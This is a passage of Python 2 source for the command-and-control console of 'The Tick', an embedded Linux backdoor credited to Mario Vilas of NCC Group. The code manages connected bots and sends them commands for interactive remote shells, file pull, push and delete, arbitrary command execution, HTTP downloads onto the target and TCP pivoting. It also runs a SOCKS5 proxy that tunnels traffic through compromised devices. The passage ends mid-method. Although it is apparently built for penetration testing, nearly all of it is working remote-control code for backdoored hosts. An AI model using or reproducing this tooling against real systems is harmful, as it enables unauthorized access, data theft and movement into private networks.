    @bot_action
    def system_shell(self):
        self.sock.sendall( build_command(CMD_SYSTEM_SHELL) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock

    @bot_action
    def file_read(self, remote_file, local_file):
        self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
        data_len = get_resp_header(self.sock)
        with open(local_file, "wb") as fd:
            copy_stream(self.sock.makefile(), fd, data_len)

    @bot_action
    def file_write(self, local_file, remote_file):
        with open(local_file, "rb") as fd:
            fd.seek(0, 2)
            file_size = fd.tell()
            fd.seek(0, 0)
            self.sock.sendall( build_command(CMD_FILE_WRITE, remote_file, file_size) )
            copy_stream(fd, self.sock.makefile(), file_size)
        get_resp_no_data(self.sock)

    @bot_action
    def file_delete(self, remote_file):
        self.sock.sendall( build_command(CMD_FILE_DELETE, remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_exec(self, command_line):
        self.sock.sendall( build_command(CMD_FILE_EXEC, command_line) )
        return get_resp_with_data(self.sock)

    @bot_action
    def file_chmod(self, remote_file, mode_flags = 0o777):
        self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def http_download(self, url, remote_file):
        self.sock.sendall( build_command(CMD_HTTP_DOWNLOAD, url, remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def dns_resolve(self, domain):
        self.sock.sendall( build_command(CMD_DNS_RESOLVE, domain) )
        response = get_resp_with_data(self.sock)
        ##print " ".join("%02x" % ord(x) for x in response)   # XXX DEBUG
        answer = []
        while response:
            family, = unpack("!B", response[0])
            if family == AF_INET:
                addr = response[1:5]
                response = response[5:]
            elif family == AF_INET6:
                addr = response[1:17]
                response = response[17:]
            else:
                raise AssertionError()
            answer.append(inet_ntop(family, addr))
        return answer

    @bot_action
    def tcp_pivot(self, address, port):
        self.sock.sendall( build_command(CMD_TCP_PIVOT, build_pivot_struct(address, port)) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock

##############################################################################
# Various background daemons for the console UI.

# Daemon for remote shells.
class RemoteShell(Thread):

    def __init__(self, sock):

        # Socket connected to a remote shell.
        self.sock = sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = True

        # Call the parent class constructor.
        super(RemoteShell, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything coming from the remote shell to standard output.
    def run(self):
        try:
            while self.alive:
                buffer = self.sock.recv(1024)
                if not buffer:
                    break
                sys.stdout.write(buffer)
        except:
            pass
        finally:
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass

    # This method is invoked from the main thread.
    # It forwards everying from standard input to the remote shell.
    # It launches the background thread and kills it before returning.
    # Control+C is caught within this function, which causes the
    # remote shell to be stopped without killing the console.
    def run_parent(self):
        self.start()
        try:
            while self.alive:
                buffer = sys.stdin.readline()
                if not buffer:
                    break
                self.sock.sendall(buffer)
        except:     # DO NOT change this bare except: line
            pass    # I don't care what PEP8 has to say :P
        finally:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass
            self.join()

# Pivoting daemon.
class TCPForward(Thread):

    def __init__(self, src_sock, dst_sock):

        # Keep the source and destination sockets.
        # This class only forwards in one direction,
        # so you have to instance it twice and swap
        # the source and destination sockets.
        self.src_sock = src_sock
        self.dst_sock = dst_sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Call the parent class constructor.
        super(TCPForward, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything from the source socket
    # into the destination socket. If either socket
    # dies the other is closed and the thread dies.
    def run(self):
        self.alive = True
        try:
            while self.alive:
                buffer = self.src_sock.recv(65535)
                if not buffer:
                    break
                self.dst_sock.sendall(buffer)
        except:
            pass
        finally:
            self.kill()

    # Forcefully kill the background thread.
    # This one is easier than the others. :)
    def kill(self):
        if not self.alive:
            return
        self.alive = False
        try:
            self.src_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.src_sock.close()
        except Exception:
            pass
        try:
            self.dst_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.dst_sock.close()
        except Exception:
            pass

# SOCKS proxy daemon.
class SOCKSProxy(Thread):

    def __init__(self, listener, uuid, bind_addr = "127.0.0.1", port = 1080, username = "", password = ""):

        # The listener that requested to proxy through a bot.
        self.listener = listener

        # The UUID of the bot we'll use to route proxy requests.
        self.uuid = uuid

        # The address to bind to when listening for SOCKS requests.
        # Normally 0.0.0.0 for a shared proxy, 127.0.0.1 for private.
        self.bind_addr = bind_addr

        # The port to listen to for incoming SOCKS proxy requests.
        self.port = port

        # Optional username and password for the SOCKS proxy.
        self.username = username
        self.password = password
        if (username or password) and not (username and password):
            raise ValueError("Must specify both username and password or neither")

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Listening socket for incoming SOCKS proxy requests.
        # Will be created and destroyed inside the run() method.
        self.listen_sock = None

        # This is where we'll keep all the TCP forwarders.
        self.bouncers = []

        # Call the parent class constructor.
        super(SOCKSProxy, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    def run(self):

        # It's aliiiiiiive! \o/
        self.alive = True

        try:

            # Listen on the specified port.
            self.listen_sock = socket()
            self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.listen_sock.bind((self.bind_addr, self.port))
            self.listen_sock.listen(5)

            # Loop until they ask us to stop.
            while self.alive:

                # Accept incoming connections.
                # TODO add a console notification here?
                accept_sock = self.listen_sock.accept()[0]

                # Serve each request one by one.
                # This is a bit crappy because, in theory, someone could
                # connect a socket here and just wait, blocking the whole
                # thing. But I don't think we should worry about that.
                # Normal requests won't block because we'll spawn a thread
                # for each once the tunnel has been established.
                # On error, destroy the socket.
                try:
                    self.serve_socks_request(accept_sock)
                except:
                    try:
                        accept_sock.shutdown(2)
                    except Exception:
                        pass
                    try:
                        accept_sock.close()
                    except Exception:
                        pass
                    if self.alive:
                        #print_exc() # XXX DEBUG
                        continue
                    raise

        # Kill the proxy on error.
        except Exception:
            #if self.alive:
            #    print_exc()         # XXX DEBUG
            #    try:
            #        self.kill()
            #    except Exception:
            #        print_exc()     # XXX DEBUG
            #else:
                try:
                    self.kill()
                except Exception:
                    pass

        # Make sure to clean up on exit.
        finally:

            # Not alive anymore. :sadface:
            self.alive = False

            # Destroy the listening socket.
            try:
                self.listen_sock.shutdown(2)
            except Exception:
                pass
            try:
                self.listen_sock.close()
            except Exception:
                pass

    # Process each SOCKS proxy request.
    # This method runs in a background thread and may spawn more threads.
    # Caller is assumed to destroy the socket after the call.
    def serve_socks_request(self, sock):

        # This blog post helped me a lot :)
        # https://rushter.com/blog/python-socks-server/

        # First header is the version and acceptable auth methods.
        # We only support SOCKS 5 and will ignore the auth. :P
        request = recvall(sock, 2)
        if len(request) != 2:
            return          # fail silently
        version, num_auth = unpack("!BB", request)
        if version != 5:
            return          # prevents easy fingerprinting
            #sock.sendall(pack("!BB", 5, 0xff))
            #raise RuntimeError("Bad SOCKS client")
        methods = recvall(sock, num_auth)

        # If we have a username and password, ask for them.
        # If we don't then just let them it. :)
        # If the client insists on giving us a password
        # anyway, just accept anything they send us.
        # TODO perhaps notify the console when this happens?
        if (self.username and self.password) or "\x00" not in methods:
            sock.sendall(pack("!BB", 5, 2))
            request = recvall(sock, 2)
            if not request:
                return          # fail silently
            version, ulen = unpack("!BB", request)
            assert version == 1
            uname = recvall(sock, ulen)
            plen, = unpack("!B", recvall(sock, 1))
            passwd = recvall(sock, ulen)
            if self.username and self.password and (self.username != uname or self.password != passwd):
                sock.sendall(pack("!BB", 5, 0xff))
                # TODO perhaps notify the console when this happens?
                #raise RuntimeError("SOCKS authentication failure, user: %r, pass: %r" % (uname, passwd))
                return          # fail silently
            sock.sendall(pack("!BB", 1, 0))
        else:
            sock.sendall(pack("!BB", 5, 0))

        # If all went well we should get a proxy request now.
        # We only support CONNECT requests for IPv4.
        request = recvall(sock, 4)
        if not request:
            return          # fail silently
        version, cmd, _, atyp = unpack("!BBBB", request)
        if version != 5 or cmd != 1 or atyp not in (1, 3):
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            return
            #raise RuntimeError("Unsupported SOCKS request")
        if atyp == 1:
            addr = inet_ntoa(recvall(sock, 4))
            port, = unpack("!H", recvall(sock, 2))
        elif atyp == 3:
            name_len, = unpack("!B", recvall(sock, 1))
            name = recvall(sock, name_len)
            port, = unpack("!H", recvall(sock, 2))
        else:
            raise AssertionError("wtf")

        # Try to get the bot now.
        # If we can't find it, reject the connection attempt.
        try:
            bot = self.listener.bots[self.uuid]
        except Exception:
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            raise

        # Do a DNS resolution remotely if needed.
        if atyp == 3:
            try:
                addr = None
                for x in bot.dns_resolve(name):
                    try:
                        inet_aton(x)
                        addr = x
                        break
                    except error:
                        continue
                if not addr:
                    raise RuntimeError("could not resolve %s to ipv4 address" % name)
            except Exception:
                sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
                raise

        # Do a TCP pivot on the bot.
        try:
            bot_sock = bot.tcp_pivot(addr, port)
        except Exception:
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            raise

        try:

            # Tell the client the connection was successful.
            sock.sendall(pack("!BBBB", 5, 0, 0, 1) + inet_aton(addr) + pack("!H", port))

            # Launch the TCP forwarders now.
            bouncer_1 = TCPForward(sock, bot_sock)
            bouncer_2 = TCPForward(bot_sock, sock)
            bouncer_1.start()
            bouncer_2.start()
            self.bouncers.append(bouncer_1)
            self.bouncers.append(bouncer_2)

        # Clean up the pivoted connection on exception.
        except Exception:
            try:
                bot_sock.shutdown(2)
            except Exception:
                pass
            try:
                bot_sock.close()
            except Exception:
                pass
            raise

    # Forcefully kill the background thread.
    # The accept() call is a bit particular in Python,
    # we can't just close the socket and call it a day.
    # This resulted in stubborn listener threads who simply
    # refused to die... extreme measures had to be taken. ;)
    def kill(self):

        # Trivial case.
        if not self.alive:
            return

        # Set the flag to false so the thread
        # knows we are asking it to quit.
        self.alive = False

        try:

            # Connect briefly to the listnening port.
            # This will "wake up" the thread stuck
            # in the blocking socket accept() call.
            s = socket()
            try:
                s.connect(("127.0.0.1", self.port))
            finally:
                s.close()

        finally:

            # Kill all the TCP forwarders too.
            while self.bouncers:
                bouncer = self.bouncers.pop()
                try:
                    bouncer.kill()
                except Exception:
                    print_exc()     # XXX DEBUG
                    pass

##############################################################################
# The Tick console. This is the one that launches everything else.

# Based on the standard cmd module, but with various hacks inside.
# And with pretty colors! Colorrrrrrssssssssssssssssssss!
class Console(Cmd):
    "Interactive text console to manage The Tick bots."

    # Header for help page.
    doc_header = 'Available commands (type help * or help <command>)'

    def __init__(self, args = ()):

        # This member will contain the currently selected bot.
        self.current = None

        # This is a set of previously seen bot UUIDs.
        # We use this to avoid notifying the user for bot reconnections,
        # since we only want to show new bots connecting to the C&C.
        # Reconnections may happen sporadically and just clutter the screen.
        self.known_bots = set()

        # These are the currently running SOCKS proxies.
        # Keys are port numbers, values are SOCKSProxy objects.
        # See the do_proxy() method for more details.
        self.proxies = {}

        # The TCP port listener for bots will be here.
        self.listener = None

        # This is the list of queued notifications.
        # Notifications come from a background thread and when possible
        # they are shown in real time, but when not they are queued here.
        self.notifications = []

        # This flag is related to the notifications.
        # We'll use it to know whether it's safe to print them directly
        # or we should wait until a better time to do it. Specifically,
        # we will only print notifications in real time if the main thread
        # is blocked waiting for user input, and queue them in any other case.
        self.inside_prompt = False

        # All the supported command line switches go here.
        parser = ArgumentParser(formatter_class=ColorHelpFormatter,
                prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
                description="Embedded Linux Backdoor by Mario Vilas (NCC Group)")
        parser.add_argument("--version", action="version",
                version="The Tick, by Mario Vilas (NCC Group), version " + Fore.YELLOW + "0.1" + Style.RESET_ALL)
        parser.add_argument("-b", "--bind", dest="bind_addr", default="0.0.0.0",
                metavar=Fore.BLUE+Style.BRIGHT+"ADDRESS"+Style.RESET_ALL,
                help="IP address to bind all the listeners to [default: "+Fore.YELLOW+"0.0.0.0"+Style.RESET_ALL+"]")
        parser.add_argument("-p", "--port", type=int, default=5555,
                metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
                help="Port to bind the TCP listener to [default: "+Fore.YELLOW+"5555"+Style.RESET_ALL+"]")
        parser.add_argument("--no-color", action="store_true", default=False,
                help=("Disable the use of ANSI escape sequences (i.e. pretty "+
                Fore.RED+"c"+Style.BRIGHT+"o"+Fore.YELLOW+"l"+Fore.GREEN+"o"+Fore.BLUE+"r"+Fore.MAGENTA+"s"+Style.RESET_ALL+
                " and other niceties)"))
        parser.add_argument("--pro", action="store_true", default=False,
                help="Replace the 0ldsch00l bloody banner with a cleaner, more sober banner,"\
                " one more suitable for a pentesting report from an infosec professional"\
                " such as yourself. Yes, this is who you are now. Accept it.")

        # Try to adjust the help text to the console size.
        # On error just ignore it and go with the default.
        try:
            width = int(check_output('stty size 2>/dev/null', shell=True).split(' ')[1])
            if width > 160: width = 140
            elif width < 80: width = 80
            os.environ["COLUMNS"] = str(width)
        except Exception:
            pass

        # Parse the command line arguments.
        self.args = parser.parse_args(args)

        # Show either the fun or the boring banner.
        self.use_boring_banner = self.args.pro

        # Call the parent class constructor.
        Cmd.__init__(self)

    # Context manager to ensure proper cleanup.
    # Launching the daemons is done here to ensure it's mandatory.
    def __enter__(self):

        # Fire up the TCP C&C listener.
        self.listener = Listener(self.notify_new_bot, self.args.bind_addr, self.args.port)
        self.listener.start()

        # Comply with the context managers protocol.
        return self

    # Context manager to ensure proper cleanup.
    # This will kill all the background daemons.
    def __exit__(self, *args):
        try:
            for proxy in self.proxies.values():
                try:
                    proxy.kill()
                except Exception:
                    print_exc()
        except Exception:
            print_exc()
        try:
            self.listener.kill()
        except Exception:
            print_exc()

    # This method is called by the listener whenever a new bot connects.
    # It will show a message to the user right below the command prompt.
    # Note that this method will be invoked from a background thread.
    def notify_new_bot(self, listener, bot):

        # Notifications for reconnecting bots are skipped because they're
        # not very useful except for debugging.
        if bot.uuid not in self.known_bots:

            # Prepare the notification text.
            index = listener.bots.keys().index(bot.uuid)
            text = "Bot %d [%s] connected from %s" % (index, bot.uuid, bot.from_addr[0])
            text = Fore.BLUE + Style.BRIGHT + text + Style.RESET_ALL

            # If the main thread is blocked waiting at the prompt,
            # do some ANSI escape codes magic to insert the notification text on screen.
            # Note that we cannot use this trick if --no-color was specified.
            # (I mean, we could, but what if the reason the colors were turned off
            # was that the C&C was not being run in a console with a proper tty?)
            if self.inside_prompt and ANSI_ENABLED:
                buf_bkp = readline.get_line_buffer()
                sys.stdout.write("\033[s\033[0G\033[2K" + text + "\n")
                sys.stdout.write(self.prompt.replace("\x01", "").replace("\x02", "") + buf_bkp + "\033[u\033[1B")
                readline.redisplay()

            # If we are not blocked at the prompt, better not write now!
            # We would be messing up the output of some command.
            # We'll queue the notification instead to be shown later.
            else:
                self.notifications.append(text)

            # Remember we've seen this bot so we don't notify again.
            self.known_bots.add(bot.uuid)

    # Hook the precmd event to know when we're out of the command prompt.
    def precmd(self, line):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # Set the flag to indicate we're NOT blocked at the prompt.
            self.inside_prompt = False

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't run commands!
        return line

    # Hook the precmd event to know when we're in the command prompt.
    # This is also a good time to issue the queued notifications.
    def postcmd(self, stop, line):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # If we have queued notifications, show them now.
            while self.notifications:
                print self.notifications.pop(0)

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't quit!
        return stop

    # Hook the preloop event because otherwise we don't
    # find out when the prompt is shown for the first time.
    def preloop(self):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

    # Default behaviour for the base class is to repeat the last command if
    # a blank line is given. This is quite dangerous so we're disabling it.
    def emptyline(self):
        return ""

    # This property generates the banner.
    @property
    def intro(self):

        # Prepare the dynamic part of the banner.
        listening_on = ("Listening on: %s:%d" % (self.listener.bind_addr, self.listener.port))

        # Boring banner :(
        if self.use_boring_banner:
            return (
                BORING_BANNER +
                " Embedded Linux Backdoor\nby Mario Vilas (NCC Group)\n\n" +
                Fore.GREEN + listening_on + Style.RESET_ALL
            )

        # Fun banner :)
        return (
            FUN_BANNER +
            Style.BRIGHT +
            "                Embedded Linux Backdoor\n" + Style.NORMAL +
            "               by Mario Vilas (NCC Group)\n\n" +
            Fore.GREEN + listening_on + Style.RESET_ALL
        )

    # This property generates the command prompt.
    @property
    def prompt(self):

        # If the currently selected bot is not alive, deselect it automatically.
        # This may happen for example if the bot dies after executing a command,
        # the connection is dropped unexpectedly, or the command was one of those
        # that reuse the C&C socket to do something else.
        if self.current is not None and (not self.current.alive or self.is_bot_busy()):
            self.current = None

        # If no bot is selected, show the corresponding prompt.
        if self.current is None:
            return "\x01" + Fore.RED + "\x02" + "[No bot selected] " + "\x01" + Style.RESET_ALL + "\x02"

        # If a bot is selected, show its info in the prompt.
        bot = self.current
        index = self.listener.bots.keys().index(bot.uuid)
        addr = bot.from_addr[0]
        return "\x01" + Fore.GREEN + Style.BRIGHT + "\x02" + ("[Bot %d: %s] " % (index, addr)) + "\x01" + Style.RESET_ALL + "\x02"

    # Helper function to tell if a bot is busy.
    # If no bot is given, the currently selected bot is tested.
    def is_bot_busy(self, bot = None):
        if bot is None:
            bot = self.current
            if bot is None:
                return False
        uuid = bot.uuid
        for x in self.proxies.values():
            if x.uuid == uuid:
                return True
        return False

    #
    # The implementation for each command follows.
    #

    def do_help(self, line):
        """
    \x1b[32m\x1b[1mhelp\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m \x1b[34m\x1b[1m*\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m <\x1b[34m\x1b[1mcommand\x1b[0m> [\x1b[34m\x1b[1mcommand\x1b[0m...]

    Without arguments, shows the list of available commands.
    With arguments, shows the help for one or more commands.
    Use "\x1b[34m\x1b[1mhelp *\x1b[0m" to show help for all commands at once.
    The question mark "\x1b[34m\x1b[1m?\x1b[0m" can be used as an alias for "\x1b[34m\x1b[1mhelp\x1b[0m".\n"""
        if not line.strip():
            Cmd.do_help(self, line)
        else:
            commands = split(line, comments=True)
            if commands == ["*"]:
                commands = self.get_names()
                commands = [ x[3:] for x in commands if x.startswith("do_") ]
                commands.sort()
            last = len(commands) - 1
            index = 0
            for cmd in commands:
                Cmd.do_help(self, cmd)
                if index < last:
                    print Fore.RED + Style.BRIGHT + ("-" * 79) + Style.RESET_ALL
                index += 1

    def do_exit(self, line):
        """
    \x1b[32m\x1b[1mexit\x1b[0m

    Exit the command interpreter.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help exit")
            return

        # Quit the command intepreter.
        # The context manager will take care of cleaning up.
        return True

    def do_clear(self, line):
        """
    \x1b[32m\x1b[1mclear\x1b[0m

    Clear the screen.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help clear")
            return

        # Clear the screen using the magic of ANSI escape codes.
        # We need to make sure the escape codes are not being filtered out.
        if not ANSI_ENABLED:
            deinit()
            init()
        print "\033[2J\033[1;1f"
        if not ANSI_ENABLED:
            deinit()
            init(wrap = True, strip = True)

    def do_bots(self, line):
        """
    \x1b[32m\x1b[1mbots\x1b[0m

    List all currently connected bots.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help bots")
            return

        # If we have no connected bots, just show an error message.
        if not self.listener.bots:
            print Fore.YELLOW + "No bots have connected yet" + Style.RESET_ALL
            return

        # We will show the list of bots in an ASCII art table.
        # Because of course we will. ;)
        # Note that we can't use ANSI escapes here because the
        # size calculations for the table go wrong, so we do a
        # dirty trick instead with placeholder characters.
        table = Texttable()
        table.set_deco(Texttable.HEADER)
        table.set_cols_dtype(("i", "t", "t", "t"))
        table.set_cols_align(("l", "c", "c", "c"))
        table.set_cols_valign(("t", "t", "t", "t"))
        table.set_cols_width((len(str(len(self.listener.bots))), 38, 17, 6))
        table.add_rows((("#", "UUID", "IP address", "Status"),), header = True)
        i = 0
        for bot in self.listener.bots.values():
            busy = self.is_bot_busy(bot)
            status = "\x01gone\x04"
            if bot.alive:
                status = "\x03live\x04"
            if busy:
                status = "\x02busy\x04"
            table.add_row((
                i,
                bot.uuid,
                "\x02" + bot.from_addr[0] + "\x04",
                status
            ))
            i += 1
        text = table.draw()
        text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
        text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
        text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
        text = text.replace("\x04", Style.RESET_ALL + " ")
        print
        print text
        print

    def do_current(self, line):
        """
    \x1b[32m\x1b[1mcurrent\x1b[0m

    Shows the currently selected bot.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help current")
            return

        # If no bot is selected, show a simple message.
        if self.current is None:
            print Fore.YELLOW + "No bot selected" + Style.RESET_ALL
            return

        # Show the details of the currently selected bot.
        bot = self.current
        addr = bot.from_addr[0]
        uuid = bot.uuid
        index = self.listener.bots.keys().index(uuid)
        print (
            "\n" +
            "Bot number: #%d\n" +
            "IP address: %s\n" +
            "UUID: [" + Fore.BLUE + Style.BRIGHT + "%s" + Style.RESET_ALL + "]\n"
        ) % (index, addr, uuid)

    def do_use(self, line):
        """
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mIP address\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mnumber\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mUUID\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m

    Select a bot to use. Try the "\x1b[32m\x1b[1mbots\x1b[0m" command to list the available bots.
    When invoked with no arguments, the currently selected bot is deselected.\n"""

        # When invoked with no arguments, deselect the current bot.
        line = line.strip()
        if not line:
            self.current = None
        else:

            # Parse the arguments, on error show help.
            try:
                bot_id, = split(line, comments=True)
            except Exception:
                self.onecmd("help use")
                return

            # If a UUID was passed, we can fetch it directly from the dict.
            try:
                bot = self.listener.bots[bot_id]
            except KeyError:

                # If a number was passed, we can get it by index.
                # That's why we used an OrderedDict in the listener.
                try:
                    bot = self.listener.bots.values()[ int(bot_id) ]
                except IndexError:
                    print Fore.YELLOW + ("Error: no bot number %d found" % int(bot_id)) + Style.RESET_ALL
                    return
                except ValueError:

                    # Last change: was it an IP address?
                    # Fetch the first bot we can find from that IP.
                    # There may be more than one (think a LAN behind a NAT),
                    # but that's the user's problem, not ours...
                    try:
                        inet_aton(bot_id)
                    except error:
                        self.onecmd("help use")     # wasn't an IP either :(
                        return
                    found = False
                    index = 0
                    for bot in self.listener.bots.values():
                        if bot.alive and bot_id == bot.from_addr[0]:
                            found = True
                            break
                        index = index + 1
                    if not found:
                        print Fore.YELLOW + ("Error: no bot connected to IP address %s" % bot_id) + Style.RESET_ALL
                        return

            # The bot must not be busy.
            if self.is_bot_busy(bot):
                print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
                return

            # The bot must be alive.
            if not bot.alive:
                print Fore.YELLOW + "Bot is disconnected" + Style.RESET_ALL
                return

            # Select the bot.
            self.current = bot

    def do_pull(self, line):
        """
    \x1b[32m\x1b[1mpull\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m> <\x1b[34m\x1b[1mlocal file\x1b[0m>

    Pull a file from the target machine.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            remote_file, local_file = split(line, comments=True)
        except Exception:
            self.onecmd("help pull")
            return

        # Perform the operation.
        self.current.file_read(remote_file, local_file)

    def do_push(self, line):
        """
    \x1b[32m\x1b[1mpush\x1b[0m <\x1b[34m\x1b[1mlocal file\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Push a file into the target machine.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            local_file, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd("help push")
            return

        # Perform the operation.
        self.current.file_write(local_file, remote_file)

    def do_chmod(self, line):
        """
    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>

    Change a file's access mode flags.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            remote_file, mode_flags = split(line, comments=True)
        except Exception:
            self.onecmd("help chmod")
            return

        # Perform the operation.
        self.current.file_chmod(remote_file, int(mode_flags, 8))

    def do_rm(self, line):
        """
    \x1b[32m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>

    Delete a file.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            remote_file, = split(line, comments=True)
        except Exception:
            self.onecmd("help rm")
            return

        # Perform the operation.
        self.current.file_delete(remote_file)

    def do_exec(self, line):
        """
    \x1b[32m\x1b[1mexec\x1b[0m <\x1b[34m\x1b[1mcommand line\x1b[0m>

    Execute a non interactive command.
    The output of the command is limited to 1024 bytes.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Perform the operation.
        output = self.current.file_exec(line)

        # If the output is exactly 1023 bytes long,
        # that means it was likely truncated.
        if len(output) == 1023:
            output += "\n" + Fore.RED + Style.BRIGHT + "<output truncated>" + Style.RESET_ALL

        # Print the output from the command to screen.
        print output

    def do_download(self, line):
        """
    \x1b[32m\x1b[1mdownload\x1b[0m <\x1b[34m\x1b[1murl\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Download a file via HTTP into the target machine.
    Use the "\x1b[32m\x1b[1mpull\x1b[0m" command to retrieve the file locally afterwards.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            url, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd("help download")
            return

        # Perform the operation.
        self.current.http_download(url, remote_file)

    def do_fork(self, line):
        """
    \x1b[32m\x1b[1mfork\x1b[0m

    Fork the bot instance.
    This will create a new bot instance that will connect automatically.
    The new instance will have a new UUID.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            assert not split(line, comments=True)
        except Exception:
            self.onecmd("help fork")
            return

        # Perform the operation.
        self.current.system_fork()

    def do_shell(self, line):
        """
    \x1b[32m\x1b[1mshell\x1b[0m

    Launch an interactive shell over the C&C connection.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print Fore.YELLOW + "Bot is busy" + Style.RESET_ALL
            return

        # Parse the arguments, on error show help.
        try:
            assert not split(line, comments=True)
        except Exception:
            self.onecmd("help shell")
            return

        # Remember the UUID of the bot. We will need this later.
        uuid = self.current.uuid

        # Launch an interactive shell on top of the interpreter.
        # When the remote shell dies, return to the interpreter.
        # When Control+C is hit, return to the interpreter.
        sock = self.current.system_shell()
